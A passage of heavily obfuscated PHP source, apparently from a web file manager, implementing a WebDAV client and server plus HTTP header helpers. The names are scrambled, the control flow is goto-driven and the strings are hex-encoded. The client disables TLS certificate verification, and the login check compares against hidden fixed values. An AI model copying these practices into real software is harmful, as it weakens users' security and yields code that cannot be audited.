$this->send($D¬ÏèÓ¢°¹[1787], $Có¸½”Î¿“); } public function delete($D˜—Õ”í, $bŞÍ…ö‘˜å = '') { $DÑ¥çåÕñ¹ =& $_SERVER[…Ò×–]; if ($bŞÍ…ö‘˜å) { $this->setHeader($DÑ¥çåÕñ¹[1784], $DÑ¥çåÕñ¹[931] . $bŞÍ…ö‘˜å . $DÑ¥çåÕñ¹[934]); } return $this->send($DÑ¥çåÕñ¹[1263], $D˜—Õ”í); } public function propfind($f­’æÂ¦²Ğ) { $E¤‚ßî¤©Œ =& $_SERVER[…Ò×–]; $this->setHeader($E¤‚ßî¤©Œ[1788], $E¤‚ßî¤©Œ[83]); $this->setHeader($E¤‚ßî¤©Œ[1789], $E¤‚ßî¤©Œ[1790]); $E²ß’ÈÄÍ = $E¤‚ßî¤©Œ[1791]; return $this->send($E¤‚ßî¤©Œ[1792], $f­’æÂ¦²Ğ, $E²ß’ÈÄÍ); } public function options($F¦ŞÖªÕŠ) { return $this->send($_SERVER[…Ò×–][1793], $F¦ŞÖªÕŠ); } public function get($fÊÓ¤²›) { return $this->send($_SERVER[…Ò×–][220], $fÊÓ¤²›); } public function put($E–´ Öèå, $e‡õÆÔ­«É, $BÄİÀŞÒ¤á = '') { $dÓÍÎí–ìè =& $_SERVER[…Ò×–]; if ($BÄİÀŞÒ¤á) { $this->setHeader($dÓÍÎí–ìè[1784], $dÓÍÎí–ìè[931] . $BÄİÀŞÒ¤á . $dÓÍÎí–ìè[934]); } return $this->send($dÓÍÎí–ìè[218], $E–´ Öèå, $e‡õÆÔ­«É); } protected function send($EÅå§ÒçßÁ, $Aƒ¸ë²˜ˆ, $CíÎ›çèƒ = false, $aƒˆÌÙ„  = false) { goto bÙ»³ÙÆ¨; Aê©ÓÇ›…œ: $this->setHeader($eñË»Ëãä±); if ($CíÎ›çèƒ) { $CíÎ›çèƒ = $CÛ¢Ê¼Š[1795] . $CíÎ›çèƒ; } if (!request_url_safe($Aƒ¸ë²˜ˆ)) { return !1; } goto B–ÁÚ±•ˆ; b¦ø¥¬…¾ß: curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto EÕè‰¡éÇà; bÙ»³ÙÆ¨: $CÛ¢Ê¼Š =& $_SERVER[…Ò×–]; $eñË»Ëãä± = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($CÛ¢Ê¼Š[1794], $CÛ¢Ê¼Š[50]); goto Aê©ÓÇ›…œ; B–ÁÚ±•ˆ: $eÒÀ†áÈ‚Õ = curl_init($Aƒ¸ë²˜ˆ); curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_CUSTOMREQUEST, $EÅå§ÒçßÁ); curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto b¦ø¥¬…¾ß; EÕè‰¡éÇà: curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($eÒÀ†áÈ‚Õ, CURLOPT_SSL_VERIFYHOST, !1); $bòÖ¡¬—Æ = curl_exec($eÒÀ†áÈ‚Õ); goto CÒâã¶¤Òî; CÒâã¶¤Òî: $this->header = array(); return $bòÖ¡¬—Æ; goto F±›¶Æé§£; F±›¶Æé§£: } } class HttpDavServer { public function __construct($A³‘ÕĞ•©, $FÉ‰Èî˜›) { $this->root = $A³‘ÕĞ•©; $this->initPath($FÉ‰Èî˜›); $this->start(); } public function initPath($f„òÕ£é¹¡) { $Dğ„ùØĞã =& $_SERVER[…Ò×–]; $cØ¿‘ƒ·Ö = rtrim($_SERVER[$Dğ„ùØĞã[1400]], $Dğ„ùØĞã[8]) . $Dğ„ùØĞã[8]; $this->urlBase = substr($cØ¿‘ƒ·Ö, 0, strpos($cØ¿‘ƒ·Ö, $f„òÕ£é¹¡) + 1); $this->urlBase = rtrim($this->urlBase, $Dğ„ùØĞã[8]) . $f„òÕ£é¹¡; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $D­ˆº‚”ó® =& $_SERVER[…Ò×–]; $CóÀğ¾Û« = HttpAuth::get(); if ($CóÀğ¾Û«[$D­ˆº‚”ó®[539]] == $D­ˆº‚”ó®[1796] && $CóÀğ¾Û«[$D­ˆº‚”ó®[903]] == $D­ˆº‚”ó®[1797]) { return !0; } HttpAuth::error(); } public function start() { goto CØ¥ã˜„Ï×; A±Èôåï: if (!method_exists($this, $eÈÎ½¬È¢æ)) { pr($eÈÎ½¬È¢æ . $EµÈ½¾µÏ•[1798]); die; } $fÄ…‡“Ò‘ô = array($EµÈ½¾µÏ•[1799], $EµÈ½¾µÏ•[1800]); if (!in_array($eÈÎ½¬È¢æ, $fÄ…‡“Ò‘ô) && !$this->pathExists($this->path)) { $Dó´ªÙÅ©­ = array($EµÈ½¾µÏ•[1043] => 404); } else { $Dó´ªÙÅ©­ = $this->{$eÈÎ½¬È¢æ}(); } goto dƒ§‚×ÄŸã; dƒ§‚×ÄŸã: if (!$Dó´ªÙÅ©­) { return; } self::response($Dó´ªÙÅ©­); goto dôùÇñÛßÏ; CØ¥ã˜„Ï×: $EµÈ½¾µÏ• =& $_SERVER[…Ò×–]; $this->checkUser(); $eÈÎ½¬È¢æ = $EµÈ½¾µÏ•[144] . HttpHeader::method(); goto A±Èôåï; dôùÇñÛßÏ: } public function pathGet($B·½‰Ò§ƒ¢ = false) { $B™ ˜‰‹ğ =& $_SERVER[…Ò×–]; $F…ó©²†ÎÎ = $B·½‰Ò§ƒ¢ ? $_SERVER[$B™ ˜‰‹ğ[1801]] : $_SERVER[$B™ ˜‰‹ğ[1400]]; $F…ó©²†ÎÎ = KodIO::clear(rawurldecode($F…ó©²†ÎÎ)); if (!strstr($F…ó©²†ÎÎ, KodIO::clear($this->urlBase))) { return !1; } return substr($F…ó©²†ÎÎ, strpos($F…ó©²†ÎÎ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($c›—²‹¾‹°) { return file_exists($c›—²‹¾‹°); } public function pathMkdir($d¥ĞæàáÃÚ) { return mkdir($d¥ĞæàáÃÚ, 511, !0); } public function pathInfo($EÄƒ¢çª¤Ñ) { return path_info($EÄƒ¢çª¤Ñ); } public function pathList($eÆ®˜îò‡²) { return path_list($eÆ®˜îò‡²); } public function pathOut($b×ç¯õË¡Ú) { echo file_get_contents($b×ç¯õË¡Ú); } public function pathPut($cáÕàˆ‹„œ, $aÍ¶¼ïêÆ = '') { if (!$aÍ¶¼ïêÆ) { return file_put_contents($cáÕàˆ‹„œ, $_SERVER[…Ò×–][33]); } return move_path($aÍ¶¼ïêÆ, $cáÕàˆ‹„œ); } public function pathRemove($a‡­™¹Ñ ù) { if (is_file($a‡­™¹Ñ ù)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($eÒ„¡…Øæ¥, $AÌéôšÑÚ·) { return move_path($eÒ„¡…Øæ¥, $AÌéôšÑÚ·); } public function pathCopy($E’ÀÈÚ—ñ, $BÙğ¢òÇ¾¬) { return copy_dir($E’ÀÈÚ—ñ, $BÙğ¢òÇ¾¬); } public function parsePath($b¨»Ïß¹É¯) { return $b¨»Ïß¹É¯; } public function parseItem($fö¢¤¯ºŠ‚, $fŒøõ»íä¿) { goto C²èá×¾•â; e—‰Šœ¶»‘: if ($fŒøõ»íä¿) { $CÙÌ…À™½ = $bŒ¢¦àÕå‹[8] . str_replace($bŒ¢¦àÕå‹[176], $bŒ¢¦àÕå‹[8], rawurlencode($this->pathGet())); } if (!trim($fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[107]])) { $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[107]] = time(); } if (!trim($fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[191]])) { $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[191]] = time(); } goto f—ù­™Ğò; f—ù­™Ğò: $D®çíšÚ™ê = array($bŒ¢¦àÕå‹[1802] => KodIO::clear($this->urlBase . $CÙÌ…À™½), $bŒ¢¦àÕå‹[107] => @gmdate($bŒ¢¦àÕå‹[1803], $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[107]]), $bŒ¢¦àÕå‹[191] => @gmdate($bŒ¢¦àÕå‹[1804], $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[191]]), $bŒ¢¦àÕå‹[77] => $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[77]] ? $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[77]] : 0); return $D®çíšÚ™ê; goto a¿Õƒ®ïÅò; C²èá×¾•â: $bŒ¢¦àÕå‹ =& $_SERVER[…Ò×–]; $CÙÌ…À™½ = $this->pathGet() . $bŒ¢¦àÕå‹[8] . $fö¢¤¯ºŠ‚[$bŒ¢¦àÕå‹[28]]; $CÙÌ…À™½ = $bŒ¢¦àÕå‹[8] . str_replace($bŒ¢¦àÕå‹[176], $bŒ¢¦àÕå‹[8], rawurlencode($CÙÌ…À™½)); goto e—‰Šœ¶»‘; a¿Õƒ®ïÅò: } public function parseItemXml($D•÷‡½²˜, $EÚÖŒØè¢™) { $aÒ¾ÇëÆİ® =& $_SERVER[…Ò×–]; $F–Æœ¯ˆøİ = $this->parseItem($D•÷‡½²˜, $EÚÖŒØè¢™); if ($D•÷‡½²˜[$aÒ¾ÇëÆİ®[29]] == $aÒ¾ÇëÆİ®[76]) { $cÀÂÔÇÂ‚â = $aÒ¾ÇëÆİ®[1805]; $cÀÂÔÇÂ‚â .= $aÒ¾ÇëÆİ®[1806]; } else { $f‰ƒäŒ¿¡÷ = $D•÷‡½²˜[$aÒ¾ÇëÆİ®[165]] ? $D•÷‡½²˜[$aÒ¾ÇëÆİ®[165]] : get_path_ext($D•÷‡½²˜[$aÒ¾ÇëÆİ®[28]]); $aãÉáÇ²Šë = get_file_mime($f‰ƒäŒ¿¡÷); $cÀÂÔÇÂ‚â = $aÒ¾ÇëÆİ®[1807]; $cÀÂÔÇÂ‚â .= "\74\x44\72\147\x65\x74\x63\x6f\156\164\145\156\x74\x74\171\160\145\x3e{$aãÉáÇ²Šë}\x3c\57\x44\x3a\x67\x65\x74\x63\x6f\x6e\x74\145\156\x74\x74\x79\x70\x65\x3e"; } return "\xa\11\11\x3c\x44\x3a\162\x65\163\x70\x6f\x6e\x73\x65\76\12\11\11\x9\x3c\x44\72\150\x72\x65\146\76{$F–Æœ¯ˆøİ[$aÒ¾ÇëÆİ®[1802]]}\x3c\57\x44\x3a\150\x72\x65\146\76\xa\x9\11\11\x3c\x44\72\160\162\157\x70\163\x74\x61\164\x3e\12\11\x9\x9\11\x3c\104\72\160\162\157\160\x3e\xa\x9\11\x9\x9\11\x3c\x44\72\147\x65\x74\154\141\163\164\155\157\x64\x69\146\x69\145\144\76{$F–Æœ¯ˆøİ[$aÒ¾ÇëÆİ®[107]]}\x3c\x2f\x44\x3a\x67\x65\164\154\x61\x73\x74\155\x6f\144\151\x66\x69\x65\x64\76\xa\11\x9\x9\x9\11\74\104\72\143\162\145\x61\x74\x69\x6f\x6e\x64\x61\164\x65\76{$F–Æœ¯ˆøİ[$aÒ¾ÇëÆİ®[191]]}\74\57\x44\72\x63\162\x65\x61\164\151\x6f\156\x64\x61\164\145\x3e\12\x9\x9\11\x9\x9\74\x44\72\147\x65\164\143\x6f\x6e\x74\x65\156\164\154\x65\x6e\147\x74\x68\76{$F–Æœ¯ˆøİ[$aÒ¾ÇëÆİ®[77]]}\x3c\x2f\x44\x3a\147\145\x74\x63\157\156\164\x65\156\164\x6c\x65\x6e\x67\x74\x68\x3e\xa\11\11\x9\x9\11{$cÀÂÔÇÂ‚â}\12\11\11\11\11\x3c\57\104\x3a\x70\162\157\160\76\xa\x9\x9\11\11\74\104\72\x73\164\141\x74\165\163\x3e\x48\x54\x54\120\x2f\61\56\x31\40\62\x30\60\40\x4f\113\74\x2f\104\72\163\164\141\x74\x75\x73\76\12\x9\x9\x9\74\57\x44\72\160\162\x6f\x70\163\x74\x61\x74\76\xa\x9\x9\x3c\x2f\x44\72\162\145\x73\160\157\x6e\163\145\x3e"; } public function pathListMerge($DšßÒ†Öö) { goto A…¦ù–í²Ñ; d…Ó‰°ì÷˜: unset($f¨ë‚İµ); return $B¤ÈË…İ±; goto fµ¦áÈ·†‡; A…¦ù–í²Ñ: $c‚¾ÄÆĞ =& $_SERVER[…Ò×–]; if (!$DšßÒ†Öö) { return $DšßÒ†Öö; } $a°ŞßŒâ‚ = array($c‚¾ÄÆĞ[73], $c‚¾ÄÆĞ[74], $c‚¾ÄÆĞ[1808]); goto EºïÙ²â¨; EºïÙ²â¨: $B¤ÈË…İ± = array(); foreach ($DšßÒ†Öö as $BÕÍ‚Í¥Ãë => $aŞç‹ÒòøÌ) { if (!in_array($BÕÍ‚Í¥Ãë, $a°ŞßŒâ‚) || !is_array($aŞç‹ÒòøÌ)) { continue; } $B¤ÈË…İ± = array_merge($B¤ÈË…İ±, $aŞç‹ÒòøÌ); } foreach ($B¤ÈË…İ± as &$f¨ë‚İµ) { $f¨ë‚İµ[$c‚¾ÄÆĞ[28]] = str_replace($c‚¾ÄÆĞ[8], $c‚¾ÄÆĞ[1402], $f¨ë‚İµ[$c‚¾ÄÆĞ[28]]); } goto d…Ó‰°ì÷˜; fµ¦áÈ·†‡: } public function httpPROPFIND() { goto bàÓ„ŞºïÏ; BÍÀê¬êÏÆ: return array($AÆºå§½øÌ[1811] => 207, $AÆºå§½øÌ[1812] => "\x3c\x44\72\155\x75\154\x74\x69\x73\164\x61\164\165\163\x20\x78\155\154\156\x73\72\x44\75\42\104\101\x56\x3a\42\x3e\xa{$AÄÄó´„Ó}\12\74\x2f\104\72\x6d\x75\x6c\164\151\x73\x74\141\x74\165\x73\x3e"); goto Cƒ´¨ª©…Š; CÈ£…ÌÜÌæ: if ($B•Í¬Èòš) { $fóëñ’¢’È = array($DÙŠ¤Ã¯Ö¯); } else { $DÙŠ¤Ã¯Ö¯[$AÆºå§½øÌ[28]] = $AÆºå§½øÌ[33]; $fóëñ’¢’È = array_merge(array($DÙŠ¤Ã¯Ö¯), $fóëñ’¢’È); } $AÄÄó´„Ó = $AÆºå§½øÌ[33]; foreach ($fóëñ’¢’È as $a‚àğÚ˜›) { $AÄÄó´„Ó .= $this->parseItemXml($a‚àğÚ˜›, $B•Í¬Èòš); } goto BÍÀê¬êÏÆ; a²Ê—¯‹Ú: $DÙŠ¤Ã¯Ö¯ = $c‚Š¬±Â²ğ[$AÆºå§½øÌ[1809]]; if (!is_array($fóëñ’¢’È) || $DÙŠ¤Ã¯Ö¯[$AÆºå§½øÌ[1810]] === !1) { return array($AÆºå§½øÌ[1811] => 404, $AÆºå§½øÌ[1812] => $AÆºå§½øÌ[1813]); } $B•Í¬Èòš = $DÙŠ¤Ã¯Ö¯[$AÆºå§½øÌ[29]] == $AÆºå§½øÌ[171] || HttpHeader::get($AÆºå§½øÌ[1788]) == $AÆºå§½øÌ[473]; goto CÈ£…ÌÜÌæ; bàÓ„ŞºïÏ: $AÆºå§½øÌ =& $_SERVER[…Ò×–]; $c‚Š¬±Â²ğ = $this->pathList($this->path); $fóëñ’¢’È = $this->pathListMerge($c‚Š¬±Â²ğ); goto a²Ê—¯‹Ú; Cƒ´¨ª©…Š: } public function httpHEAD() { $b®Ã˜Àîèœ =& $_SERVER[…Ò×–]; $AÏ¿£¹„² = $this->pathInfo($this->path); if (!$AÏ¿£¹„² || $AÏ¿£¹„²[$b®Ã˜Àîèœ[29]] == $b®Ã˜Àîèœ[76]) { return array($b®Ã˜Àîèœ[1043] => 200, $b®Ã˜Àîèœ[1220] => array($b®Ã˜Àîèœ[1814])); } return array($b®Ã˜Àîèœ[1043] => 200, $b®Ã˜Àîèœ[1220] => array($b®Ã˜Àîèœ[1815], $b®Ã˜Àîèœ[136], $b®Ã˜Àîèœ[1816] . $AÏ¿£¹„²[$b®Ã˜Àîèœ[77]], $b®Ã˜Àîèœ[1817] . get_file_mime($AÏ¿£¹„²[$b®Ã˜Àîèœ[165]]), $b®Ã˜Àîèœ[132] . gmdate($b®Ã˜Àîèœ[1803], $AÏ¿£¹„²[$b®Ã˜Àîèœ[1266]]) . $b®Ã˜Àîèœ[1818], $b®Ã˜Àîèœ[1819])); } public function httpOPTIONS() { $bÓÈöÒÜÆ¢ =& $_SERVER[…Ò×–]; return array($bÓÈöÒÜÆ¢[1043] => 200, $bÓÈöÒÜÆ¢[1220] => array($bÓÈöÒÜÆ¢[1820], $bÓÈöÒÜÆ¢[1821], $bÓÈöÒÜÆ¢[1822], $bÓÈöÒÜÆ¢[1275])); } public function httpPROPPATCH() { $DÁ«ö‹¹¼‹ =& $_SERVER[…Ò×–]; $EßöÁ…Ì†ß = $DÁ«ö‹¹¼‹[1823] . $_SERVER[$DÁ«ö‹¹¼‹[1400]] . $DÁ«ö‹¹¼‹[1824]; return array($DÁ«ö‹¹¼‹[1811] => 207, $DÁ«ö‹¹¼‹[1812] => "\74\104\x3a\x6d\x75\x6c\x74\151\x73\164\141\x74\165\x73\40\170\155\x6c\156\163\72\104\75\x22\104\101\x56\x3a\x22\76\12{$EßöÁ…Ì†ß}\12\74\x2f\x44\x3a\155\x75\154\164\x69\163\x74\x61\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $DÓã¡ë”áÏ =& $_SERVER[…Ò×–]; $C»ÜŠŸÇÚõ = $this->uploadFile(); if ($C»ÜŠŸÇÚõ) { $c ßÙ²èíƒ = 204; } else { $C»ÜŠŸÇÚõ = $DÓã¡ë”áÏ[33]; $c ßÙ²èíƒ = 201; } $Eó†—‰ÃÓ = $this->pathPut($this->path, $C»ÜŠŸÇÚõ); if ($Eó†—‰ÃÓ == !1) { $c ßÙ²èíƒ = 404; } return array($DÓã¡ë”áÏ[1811] => $c ßÙ²èíƒ); } private function uploadFile() { goto cğ„Êõ”Ùï; DË  Ñ·ËÜ: if (@filesize_64($D–‚š¸ùÖ) > 0) { return $D–‚š¸ùÖ; } @unlink($D–‚š¸ùÖ); return !1; goto fÃéŒ†½²; d„ê¾¤¨—ƒ: while (!feof($e£ì³®Ò²£)) { fwrite($FîÇÍ¶•£Ú, fread($e£ì³®Ò²£, 1024 * 200)); } fclose($e£ì³®Ò²£); fclose($FîÇÍ¶•£Ú); goto DË  Ñ·ËÜ; cğ„Êõ”Ùï: $DÅ‰ÃÔ×¦Ó =& $_SERVER[…Ò×–]; @mk_dir(TEMP_FILES); $D–‚š¸ùÖ = TEMP_FILES . $DÅ‰ÃÔ×¦Ó[1825] . rand_string(32); goto AÖÚ§Â; AÖÚ§Â: $FîÇÍ¶•£Ú = @fopen($D–‚š¸ùÖ, $DÅ‰ÃÔ×¦Ó[1535]); $e£ì³®Ò²£ = @fopen($DÅ‰ÃÔ×¦Ó[1826], $DÅ‰ÃÔ×¦Ó[1534]); if (!$e£ì³®Ò²£ || !$FîÇÍ¶•£Ú) { @unlink($D–‚š¸ùÖ); return !1; } goto d„ê¾¤¨—ƒ; fÃéŒ†½²: } public function httpMKCOL() { $eÆÈÛ‚·¾ =& $_SERVER[…Ò×–]; if ($this->pathExists($this->path)) { return array($eÆÈÛ‚·¾[1043] => 409); } $CÏØ‘Á‚»­ = $this->pathMkdir($this->path); return array($eÆÈÛ‚·¾[1043] => $CÏØ‘Á‚»­ ? 201 : 403); } public function httpMOVE() { $c¤ÈçÌºÊá =& $_SERVER[…Ò×–]; $a¡‡·õ¬ÖÑ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c¤ÈçÌºÊá[1827]])) { $F÷ãõöÊì[$c¤ÈçÌºÊá[1828]] = $_SERVER[$c¤ÈçÌºÊá[1827]] == $c¤ÈçÌºÊá[1829]; } $F ô‡¦Ë¬Û = $this->pathMove($this->path, $a¡‡·õ¬ÖÑ); return array($c¤ÈçÌºÊá[1043] => $F ô‡¦Ë¬Û ? 201 : 404); } public function httpCOPY() { $F£‹ŒÖ¨Ã‚ = $this->parsePath($this->pathGet(!0)); $c¾è½¦ê¬ = $this->pathCopy($this->path, $F£‹ŒÖ¨Ã‚); return array($_SERVER[…Ò×–][1043] => $c¾è½¦ê¬ ? 201 : 404); } public function httpDELETE() { $eøƒÉ²ç‡õ = $this->pathRemove($this->path); return array($_SERVER[…Ò×–][1043] => $eøƒÉ²ç‡õ ? 200 : 503); } public function httpLOCK() { $a›ˆ—ÇÕêø =& $_SERVER[…Ò×–]; $c‰óÔ¡ï– = md5($this->path); $fæÜ†Ç¹Õ½ = $a›ˆ—ÇÕêø[1830] . $this->xmlGet($a›ˆ—ÇÕêø[1831]) . $a›ˆ—ÇÕêø[1832] . $c‰óÔ¡ï– . $a›ˆ—ÇÕêø[1833]; return array($a›ˆ—ÇÕêø[1043] => 200, $a›ˆ—ÇÕêø[1220] => array($a›ˆ—ÇÕêø[1834] . $c‰óÔ¡ï–, $a›ˆ—ÇÕêø[1835]), $a›ˆ—ÇÕêø[1836] => $fæÜ†Ç¹Õ½); } public function httpUNLOCK() { return array($_SERVER[…Ò×–][1043] => 204); } public function xmlGet($A§Œ‘‘º) { goto AÓÇíÃÊ»; eÓ‘âÁ÷Ö: $c¹æÁ¢äÌ¹ = explode($eÒâÖ×ÈõÀ[8], $A§Œ‘‘º); $DÄ„¹ÆŒôÇ = array_shift($c¹æÁ¢äÌ¹); $fø›à¾×âù = $A¸ÒõŠ–òˆ->getElementsByTagNameNS($eÒâÖ×ÈõÀ[1838], $DÄ„¹ÆŒôÇ); goto bŸÆÒ•–Ğù; bŸÆÒ•–Ğù: if ($fø›à¾×âù) { return $fø›à¾×âù[0]->nodeValue; } return $eÒâÖ×ÈõÀ[33]; goto FŸÇ‹«†¾; AÓÇíÃÊ»: $eÒâÖ×ÈõÀ =& $_SERVER[…Ò×–]; static $A¸ÒõŠ–òˆ = false; if (!$A¸ÒõŠ–òˆ) { $dªËÉÖæœé = file_get_contents($eÒâÖ×ÈõÀ[1837]); $A¸ÒõŠ–òˆ = new DOMDocument(); $A¸ÒõŠ–òˆ->loadXML($dªËÉÖæœé); } goto eÓ‘âÁ÷Ö; FŸÇ‹«†¾: } public static function response($E†ÙøŠ´è) { goto f²éáÕµ¶Á; dÚÁŠëÀè: $d“‰ÁÏùÜ[] = $BïËöêÊ‘·[1778]; $d“‰ÁÏùÜ[] = $BïËöêÊ‘·[1779]; foreach ($d“‰ÁÏùÜ as $fÌêèÉ°ÒÌ) { header($fÌêèÉ°ÒÌ); } goto eÚ‘µœÉÛÄ; eÚ‘µœÉÛÄ: if (is_string($E†ÙøŠ´è[$BïËöêÊ‘·[1836]])) { header($BïËöêÊ‘·[1839]); $c”…Ä¨Ä¿Ú = $BïËöêÊ‘·[1840] . $BïËöêÊ‘·[221] . $E†ÙøŠ´è[$BïËöêÊ‘·[1836]]; echo $c”…Ä¨Ä¿Ú; } goto D¶·£Éœ¥; f²éáÕµ¶Á: $BïËöêÊ‘· =& $_SERVER[…Ò×–]; $d“‰ÁÏùÜ = is_array($E†ÙøŠ´è[$BïËöêÊ‘·[1220]]) ? $E†ÙøŠ´è[$BïËöêÊ‘·[1220]] : array(); $d“‰ÁÏùÜ[] = HttpHeader::code($E†ÙøŠ´è[$BïËöêÊ‘·[1043]]); goto dÚÁŠëÀè; D¶·£Éœ¥: } } class HttpHeader { public static $_headers = array("\x48\157\x73\164" => "\x48\124\124\x50\137\110\x4f\123\x54", "\125\x73\x65\162\55\101\147\145\x6e\x74" => "\x48\124\x54\120\x5f\x55\x53\x45\x52\137\101\107\105\x4e\124", "\103\x6f\156\x74\145\x6e\164\55\x54\171\160\x65" => "\110\x54\124\120\137\x43\117\x4e\x54\105\x4e\124\x5f\x54\131\120\x45", "\x43\x6f\156\164\x65\156\x74\55\x4c\x65\156\x67\164\x68" => "\110\x54\124\x50\x5f\103\x4f\116\x54\x45\x4e\124\x5f\x4c\105\116\107\124\x48", "\104\145\x70\164\150" => "\x48\x54\124\120\137\104\105\x50\x54\x48", "\105\x78\160\145\x63\164" => "\x48\124\x54\x50\137\105\x58\x50\x45\x43\x54", "\111\146\55\x4e\157\x6e\x65\x2d\115\141\x74\x63\150" => "\x48\x54\124\120\137\111\106\x5f\116\117\x4e\x45\x5f\x4d\101\124\103\110", "\111\146\x2d\115\141\164\x63\150" => "\x48\124\124\x50\137\x49\x46\x5f\x4d\101\124\103\110", "\111\x66\55\x52\141\x6e\x67\x65" => "\x48\124\124\x50\137\111\x46\137\122\x41\116\x47\105", "\114\x61\163\x74\x2d\115\x6f\144\x69\146\x69\145\x64" => "\110\x54\124\120\x5f\x4c\x41\x53\x54\x5f\115\117\104\111\106\x49\105\x44", "\x49\146\55\x4d\x6f\x64\x69\146\x69\145\x64\55\x53\151\156\143\x65" => "\x48\x54\124\120\137\111\x46\x5f\115\117\x44\111\106\x49\x45\104\x5f\123\x49\116\103\x45", "\x49\146\55\x55\x6e\x6d\157\144\151\146\151\x65\x64\55\x53\x69\156\143\x65" => "\110\124\124\120\137\111\x46\137\x55\116\115\x4f\x44\111\106\x49\105\x44\x5f\x53\x49\x4e\x43\x45", "\x52\x61\156\x67\145" => "\110\x54\x54\x50\137\122\x41\116\x47\x45", "\x54\x69\155\145\x6f\165\164" => "\110\x54\124\x50\137\x54\x49\x4d\105\117\125\x54", "\111\146" => "\x48\x54\x54\x50\137\111\x46", "\x4c\157\143\153\x2d\x54\x6f\x6b\145\156" => "\110\x54\x54\x50\137\x4c\117\103\113\x5f\x54\x4f\113\105\116", "\117\x76\145\162\x77\x72\x69\164\145" => "\x48\124\x54\120\x5f\117\126\105\122\x57\122\x49\124\105", "\x44\145\x73\x74\151\x6e\x61\164\151\x6f\x6e" => "\110\124\124\120\137\104\105\123\124\x49\x4e\x41\x54\111\x4f\116", "\122\x65\x71\165\145\163\164\x2d\111\x64" => "\122\105\x51\x55\x45\123\x54\x5f\x49\x44", "\x52\x65\161\x75\145\163\164\55\x42\157\144\171\x2d\106\x69\x6c\145" => "\x52\105\x51\125\x45\x53\124\x5f\102\x4f\x44\x59\x5f\106\x49\x4c\105", "\x52\145\144\151\x72\x65\143\164\x2d\123\164\x61\x74\165\x73" => "\122\x45\x44\x49\x52\105\x43\x54\x5f\x53\124\101\124\125\123"); public static function init() { static $aÊ»ä²ùÊ = false; if ($aÊ»ä²ùÊ) { return; } foreach ($_SERVER as $eâ¶¦–õĞŞ => $c’Î¾ÑŒì´) { $eâ¶¦–õĞŞ = strtoupper($eâ¶¦–õĞŞ); if (!array_key_exists($eâ¶¦–õĞŞ, $_SERVER)) { continue; } $_SERVER[$eâ¶¦–õĞŞ] = $c’Î¾ÑŒì´; } foreach (self::$_headers as $eâ¶¦–õĞŞ => $F…‘İ˜¿›Ì) { if (!array_key_exists($eâ¶¦–õĞŞ, $_SERVER)) { continue; } $_SERVER[$eâ¶¦–õĞŞ] = $_SERVER[$F…‘İ˜¿›Ì]; $_SERVER[strtoupper($eâ¶¦–õĞŞ)] = $_SERVER[$F…‘İ˜¿›Ì]; } } public static function get($EÆªğÇŒ) { self::init(); return $_SERVER[$EÆªğÇŒ] ? $_SERVER[$EÆªğÇŒ] : $_SERVER[$_SERVER[…Ò×–][1841] . strtoupper($EÆªğÇŒ)]; } public static function method() { return strtoupper(self::get($_SERVER[…Ò×–][154])); } public static function length() { $A‚ÃÜïí›ï =& $_SERVER[…Ò×–]; $fª³‹¸İ– = self::get($A‚ÃÜïí›ï[1842]); if (!$fª³‹¸İ–) { $fª³‹¸İ– = self::get($A‚ÃÜïí›ï[1159]); } return $fª³‹¸İ–; } public static function range() { $D¼¡…Œ‘ÍÜ =& $_SERVER[…Ò×–]; $AÕÂŒŒµôÅ = self::get($D¼¡…Œ‘ÍÜ[202]); if (!$AÕÂŒŒµôÅ) { return !1; } if (!preg_match($D¼¡…Œ‘ÍÜ[1843], $AÕÂŒŒµôÅ, $fŞï§±ßà‡)) { return !1; } if ($fŞï§±ßà‡[1] === $D¼¡…Œ‘ÍÜ[33] && $fŞï§±ßà‡[2] === $D¼¡…Œ‘ÍÜ[33]) { return !1; } return array($fŞï§±ßà‡[1] !== $D¼¡…Œ‘ÍÜ[33] ? $fŞï§±ßà‡[1] : null, $fŞï§±ßà‡[2] !== $D¼¡…Œ‘ÍÜ[33] ? $fŞï§±ßà‡[2] : null); } public static $statusCode = array("\x31\60\60" => "\103\x6f\156\164\x69\x6e\x75\145", "\x31\x30\61" => "\123\167\x69\164\143\150\x69\x6e\x67\40\120\x72\157\164\x6f\143\157\154", "\61\x30\62" => "\120\x72\157\x63\x65\x73\163\x69\156\x67", "\x31\x30\63" => "\x45\141\x72\x6c\x79\x20\110\151\x6e\x74\x73", "\x32\60\60" => "\x4f\x4b", "\x32\60\x31" => "\x43\162\x65\141\x74\145\x64", "\x32\x30\62" => "\x41\x63\x63\x65\160\x74\x65\x64", "\62\60\x33" => "\116\x6f\156\55\x41\165\164\x68\157\162\151\164\x61\164\151\166\x65\40\x49\x6e\x66\157\162\x6d\141\x74\151\157\x6e", "\62\60\64" => "\116\157\x20\x43\157\156\x74\x65\x6e\164", "\62\x30\65" => "\x52\x65\163\x65\x74\x20\x43\x6f\x6e\164\145\x6e\164", "\x32\60\x36" => "\120\x61\162\164\x69\x61\x6c\x20\x43\x6f\x6e\164\x65\x6e\164", "\x32\x30\67" => "\115\x75\x6c\x74\x69\55\x53\x74\x61\x74\x75\x73", "\x33\x30\x30" => "\x4d\165\x6c\x74\x69\x70\154\x65\x20\x43\150\157\151\x63\145\163", "\x33\60\x31" => 